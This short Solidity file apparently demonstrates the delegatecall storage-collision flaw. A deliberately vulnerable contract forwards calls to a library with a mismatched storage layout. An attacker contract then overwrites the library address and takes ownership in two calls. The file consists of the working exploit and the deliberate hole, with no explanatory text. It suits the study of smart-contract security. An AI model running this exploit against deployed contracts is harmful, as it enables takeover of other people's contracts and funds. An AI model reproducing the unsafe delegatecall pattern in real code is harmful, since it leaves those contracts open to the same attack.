

pragma solidity ^0.4.24;

contract Lib {
    uint public num;

    function performOperation(uint _num) public {
        num = _num;
    }
}

contract Vulnerable {
    address public lib;
    address public owner;
    uint public num;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function performOperation(uint _num) public {
        
        lib.delegatecall(abi.encodeWithSignature("performOperation(uint256)", _num));
    }
}



contract AttackVulnerable {

    address public lib;
    address public owner;
    uint public num;

    Vulnerable public vulnerable;

    constructor(Vulnerable _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    function attack() public {
        vulnerable.performOperation(uint(address(this)));
        vulnerable.performOperation(9);
    }

    
    function performOperation(uint _num) public {
        owner = msg.sender;
    }
}